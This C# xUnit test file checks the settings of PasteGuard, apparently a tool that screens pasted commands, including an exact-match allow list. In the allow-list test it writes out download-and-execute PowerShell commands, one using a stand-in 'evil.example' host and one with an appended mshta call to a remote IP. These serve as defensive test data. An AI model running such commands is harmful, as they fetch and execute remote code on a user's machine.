using PasteGuard;
using Xunit;

namespace PasteGuard.Tests;

public class SettingsTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "cfb-tests-" + Guid.NewGuid().ToString("N"));
    private string ConfigPath => Path.Combine(_dir, "config.json");

    public SettingsTests() => Log.PathOnDisk = Path.Combine(_dir, "events.log");

    [Fact]
    public void Defaults_are_recommended_values()
    {
        var s = Settings.Load(ConfigPath);
        Assert.Equal(70, s.Threshold);
        Assert.True(s.Enabled);
        Assert.Equal(ApiErrorAction.Restore, s.OnApiError);
        Assert.False(s.HasApiKey);
    }

    [Fact]
    public void Round_trips_and_encrypts_the_key()
    {
        var s = new Settings { Threshold = 85, OnApiError = ApiErrorAction.Block, ApiKey = "ts-secret-123" };
        s.Save(ConfigPath);

        var raw = File.ReadAllText(ConfigPath);
        Assert.DoesNotContain("ts-secret-123", raw);
        Assert.Contains("\"Block\"", raw);

        var loaded = Settings.Load(ConfigPath);
        Assert.Equal("ts-secret-123", loaded.ApiKey);
        Assert.Equal(85, loaded.Threshold);
        Assert.Equal(ApiErrorAction.Block, loaded.OnApiError);
    }

    [Theory]
    [InlineData(0, 1)]
    [InlineData(-5, 1)]
    [InlineData(250, 100)]
    public void Clamps_out_of_range_threshold(int stored, int expected)
    {
        Directory.CreateDirectory(_dir);
        File.WriteAllText(ConfigPath, $"{{\"Threshold\": {stored}}}");
        Assert.Equal(expected, Settings.Load(ConfigPath).Threshold);
    }

    [Fact]
    public void Corrupt_file_falls_back_to_defaults()
    {
        Directory.CreateDirectory(_dir);
        File.WriteAllText(ConfigPath, "{ not json");
        Assert.Equal(Settings.DefaultThreshold, Settings.Load(ConfigPath).Threshold);
    }

    [Fact]
    public void Always_allow_matches_only_the_exact_command()
    {
        var s = new Settings();
        s.Allow("irm get.scoop.sh | iex");
        s.Allow("irm get.scoop.sh | iex"); // no duplicates
        s.Save(ConfigPath);
        var loaded = Settings.Load(ConfigPath);

        Assert.Single(loaded.AllowedCommands);
        Assert.True(loaded.IsAllowed("irm get.scoop.sh | iex"));
        Assert.True(loaded.IsAllowed("  irm get.scoop.sh | iex\r\n")); // surrounding whitespace ignored
        Assert.False(loaded.IsAllowed("irm get.scoop.sh.evil.example | iex"));
        Assert.False(loaded.IsAllowed("irm get.scoop.sh | iex; mshta http://203.0.113.1/a"));
        Assert.DoesNotContain("scoop", File.ReadAllText(ConfigPath)); // only fingerprints stored
    }

    [Fact]
    public void Clearing_the_key_removes_it()
    {
        var s = new Settings { ApiKey = "abc" };
        s.ApiKey = "";
        Assert.Null(s.ApiKeyProtected);
        Assert.False(s.HasApiKey);
    }

    public void Dispose()
    {
        try { Directory.Delete(_dir, recursive: true); } catch { }
    }
}
